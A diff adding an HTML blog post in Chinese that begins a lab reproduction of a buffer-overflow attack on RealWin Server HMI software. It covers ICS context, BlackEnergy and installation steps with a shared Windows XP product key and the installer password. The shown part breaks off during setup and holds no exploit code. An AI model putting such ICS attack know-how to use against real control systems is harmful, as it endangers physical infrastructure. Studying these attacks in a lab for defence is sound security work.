@@ -1,0 +1,853 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+    <meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="橙留香">
+  <meta name="keywords" content="橙留香车联网安全技术博客">
+  
+    <meta name="description" content="也许每个人出生的时候都以为这世界都是为他一个人而存在的，当他发现自己错的时候，他便开始长大 少走了弯路，也就错过了风景，无论如何，感谢经历  更多关于Android安全的知识，可前往：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ananasorangey&#x2F;category11955914.html   0x01 前言一般来说，SCADA&#x2F;ICS 黑客有两种类型；  破解协议（modbu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="RealWin Server HMI 漏洞复现与恶意攻击链分析">
+<meta property="og:url" content="https://orangey.info/2022/09/24/123407669/index.html">
+<meta property="og:site_name" content="车联网安全技术博客 | 橙留香">
+<meta property="og:description" content="也许每个人出生的时候都以为这世界都是为他一个人而存在的，当他发现自己错的时候，他便开始长大 少走了弯路，也就错过了风景，无论如何，感谢经历  更多关于Android安全的知识，可前往：https:&#x2F;&#x2F;blog.csdn.net&#x2F;ananasorangey&#x2F;category11955914.html   0x01 前言一般来说，SCADA&#x2F;ICS 黑客有两种类型；  破解协议（modbu">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.imgtg.com/2022/09/25/gdpGP.png">
+<meta property="og:image" content="https://i.imgtg.com/2022/09/21/gNXxK.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/805f8ff6be724284844a09c5e7077d78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/696399722f76487c95fe6ec483114db8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/57c0850c644744a998ef69aa7ee5ccae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a408fbe20fc54db4b217c8cd68511198.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e177249ec6b94f26a2cddde15f3f6268.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/ddaca150cde14e6e85b470c24014b3a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6daf2cd5719e43eda306b17222a5104b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_9,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2b8cc88b4a0f4fd085220d6240236ced.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/6f7fbf7707ec488cbe69dfb7e18c1735.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/d9bd275001dd4b00b7de71c21c6b7139.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3804c1efb26a4e71af88ec888ba642da.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a2129add002d47bdb9a40a200f9ace9a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/9f3088e8eab246c7919ccd53230e4351.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_16,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/889005bc507f4c3fbd9f408bc93f4554.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_13,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/85d99647576f4ec38ae887886564f529.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/709e840afb164f619df14f1f834724bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b6f7c9a181784c638ec249157c2ecdfb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_15,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/33a954250e644346bd8a859fdabb90b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_16,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b791d60f2e4a445aaca00fb6d2d4bb5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/427e1203b1b2490faac85aec52a5dda3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c85f506f2ba74709806aff5d51ac8b05.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_11,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/7a817ac935de4ea9b0f161171c97ab3f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e521b8c44e234699a644ed23ebe9b34a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/b26a2ff8266d4228ade209aff1d3219b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/a99ceaa3cf6249b1a97213de53b808c0.png">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/512bad70722c41ad9dba235e3734bad2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/40cd168119714e21b888f0aa7b2ea062.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3e04d16f4b7443ce9f5e5672cff4555d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/288d5be5ca2a4151a06e05050ee13c22.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/3fd5fad0d2eb49bca4f7096bb51b3c1d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/1f82c5601a9a45d29968cc5ccdb848c2.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/db65caef400945b5bfa6da674f8d30ef.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/e672db6cc00d4f999b6b20684dc44743.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/c730c6e3e1214cb7a66b3aeae68b67cb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16">
+<meta property="article:published_time" content="2022-09-24T13:24:08.227Z">
+<meta property="article:modified_time" content="2022-09-24T16:42:42.478Z">
+<meta property="article:author" content="橙留香">
+<meta property="article:tag" content="ATTACK">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://i.imgtg.com/2022/09/25/gdpGP.png">
+  
+  
+  
+  <title>RealWin Server HMI 漏洞复现与恶意攻击链分析 - 车联网安全技术博客 | 橙留香</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"orangey.info","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":true,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"java"},"copy_btn":false,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>橙留香</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="RealWin Server HMI 漏洞复现与恶意攻击链分析"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-09-24 21:24" pubdate>
+          2022年9月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          <!-- compatible with older versions-->
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          <!-- compatible with older versions-->
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">RealWin Server HMI 漏洞复现与恶意攻击链分析</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <hr>
+<p><strong>也许每个人出生的时候都以为这世界都是为他一个人而存在的，当他发现自己错的时候，他便开始长大</strong></p>
+<p><strong>少走了弯路，也就错过了风景，无论如何，感谢经历</strong></p>
+<hr>
+<p>更多关于Android安全的知识，可前往：<a target="_blank" rel="noopener" href="https://blog.csdn.net/ananasorangey/category11955914.html">https://blog.csdn.net/ananasorangey/category11955914.html</a></p>
+<p><img src="https://i.imgtg.com/2022/09/25/gdpGP.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p><img src="https://i.imgtg.com/2022/09/21/gNXxK.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>一般来说，SCADA&#x2F;ICS 黑客有两种类型；</p>
+<ul>
+<li>破解协议（modbus、DNP3、Profitnet 等）</li>
+<li>破解人机界面 (HMI)</li>
+</ul>
+<p>T0823案例在监控软件中使用缓冲区溢出的 HMI 系统的案例，SCADA&#x2F;HMI 软件与其它软件一样容易出现软件漏洞</p>
+<blockquote>
+SCADA/ICS 安全性至关重要，原因有很多。未来的任何网络空间战都可能涉及某种形式的 SCADA/ICS 黑客攻击，以摧毁对手的关键基础设施，如电力、水、炼油和运输，为应对车联网攻击，可以参考该模型案例来做为建模
+<br><br>
+xxxx们可以观察、研究x以前的ICS（xxx电网）攻击案例，来了解这种攻击是如何发生的，通过研究这次攻击是为了吸取教训，保护我们的设施免受类似攻击，以便更好的应对未来相对的防御措施
+<br><br>
+对xxx电力系统的攻击是使用了一种被称为BlackEnergy 3的恶意软件
+<br><br>
+Blackenergy 是一种特洛伊木马，现已在全球范围内盘旋十多年，并在此期间进行了一些重大转变。它最初旨在为僵尸网络生成僵尸以用于 DDoS 和分布式密码攻击（BlackEnergy 1），它的模块化特性使其能够转变为 SCADA/ICS 恶意软件（BlackEnergy 3）
+</blockquote>
+
+<p>安装的系统一定要是Windows XP，要不然不兼容，XP的镜像可以去MSDN下载。Windows XP Home Edition 简体中文零售版原版 CD-KEY：BQJG2-2MJT7-H7F6K-XW98B-4HQRQ</p>
+<p><img src="https://img-blog.csdnimg.cn/805f8ff6be724284844a09c5e7077d78.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<h1 id="0x02-人机界面（HMI）"><a href="#0x02-人机界面（HMI）" class="headerlink" title="0x02 人机界面（HMI）"></a>0x02 人机界面（HMI）</h1><p>在大多数 SCADA&#x2F;ICS 安装中，都有一个专用系统用于管理和监控工业系统。业内大多数人将此称为人机界面或HMI。该系统对工业系统的管理至关重要，但也可能成为攻击者的关键载体。</p>
+<p>在大多数ICS中，HMI 位于公司内网之外，如下图所示。但在某些情况下，HMI 位于公司内网，因此容易受到破坏公司网络的攻击者的攻击</p>
+<p><img src="https://img-blog.csdnimg.cn/696399722f76487c95fe6ec483114db8.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>将 HMI 与公司网络隔离，参考 Purdue 模型如下：</p>
+<p><img src="https://img-blog.csdnimg.cn/57c0850c644744a998ef69aa7ee5ccae.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>这些 HMI 通常是基于 Windows 的系统（但在车联网车机的系统里基本上是Linux系统），安装了特殊软件来管理和监控所有工业系统，如下所示</p>
+<p><img src="https://img-blog.csdnimg.cn/a408fbe20fc54db4b217c8cd68511198.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<p>接下来，将通过利用 HMI 软件中的缓冲区溢出来利用易受攻击的 HMI 系统。一旦攻击者控制了 HMI 系统，就拥有了工业网络，然后就会发生未知的恶意活动，包括：</p>
+<ul>
+<li>禁用传感器和警报</li>
+<li>增加温度和压力</li>
+<li>改变化学品的混合和浓度</li>
+<li>改变梯形逻辑</li>
+<li>禁用安全控制</li>
+</ul>
+<h1 id="0x03-RealWin-服务器漏洞环境安装"><a href="#0x03-RealWin-服务器漏洞环境安装" class="headerlink" title="0x03  RealWin 服务器漏洞环境安装"></a>0x03  RealWin 服务器漏洞环境安装</h1><ul>
+<li>软件下载链接</li>
+</ul>
+<p>攻击 RealWin Server HMI 系统。RealWin Server 是 DATAC RealWin 的产品，DATAC RealWin 是一家被德克萨斯州 Lufkin Industries 收购的爱尔兰软件公司。</p>
+<p>软件下载：<a target="_blank" rel="noopener" href="https://exploit-db.com/apps/e8b5dc518ae0db89e5ae280abcc7a9a3-DemoRW-1.06.exe">https://exploit-db.com/apps/e8b5dc518ae0db89e5ae280abcc7a9a3-DemoRW-1.06.exe</a></p>
+<p>将RealWin Server安装到 Windows XP系统中。这是比较老的漏洞利用，但 SCADA&#x2F;ICS 行业由于其业务性质，导致更新或升级系统的速度非常慢（在许多情况下，每年可能只更新一次，甚至一直不更新）</p>
+<p>在很多时候，没有网络安全意识的新人可能无法意识到，工业系统通常在非常陈旧和过时的系统上运行，原因有很多（可参考ATT&amp;CK ICS 的T0823战术）</p>
+<ul>
+<li>下载并安装 RealWin 服务器后单击桌面图标，它会打开如下所示的界面</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/e177249ec6b94f26a2cddde15f3f6268.png" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/ddaca150cde14e6e85b470c24014b3a1.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<ul>
+<li>提示我们需要密码，此处密码为：rfx</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/6daf2cd5719e43eda306b17222a5104b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_9,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/2b8cc88b4a0f4fd085220d6240236ced.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"></p>
+<ul>
+<li>默认即可</li>
+</ul>
+<p><img src="https://img-blog.csdnimg.cn/6f7fbf7707ec488cbe69dfb7e18c1735.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/d9bd275001dd4b00b7de71c21c6b7139.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/3804c1efb26a4e71af88ec888ba642da.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/a2129add002d47bdb9a40a200f9ace9a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/9f3088e8eab246c7919ccd53230e4351.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_16,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/889005bc507f4c3fbd9f408bc93f4554.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_13,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/85d99647576f4ec38ae887886564f529.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/709e840afb164f619df14f1f834724bf.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_20,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/b6f7c9a181784c638ec249157c2ecdfb.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_15,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/33a954250e644346bd8a859fdabb90b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_16,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">- 全选下，接下来全默认<br><img src="https://img-blog.csdnimg.cn/b791d60f2e4a445aaca00fb6d2d4bb5b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述">密码为：rfx<br><img src="https://img-blog.csdnimg.cn/427e1203b1b2490faac85aec52a5dda3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6I-g6JCdX-apmeeVmemmmQ==,size_17,color_FFFFFF,t_70,g_se,x_16" srcset="/img/loading.gif" lazyload alt="在这里插入图片描述"><br><img 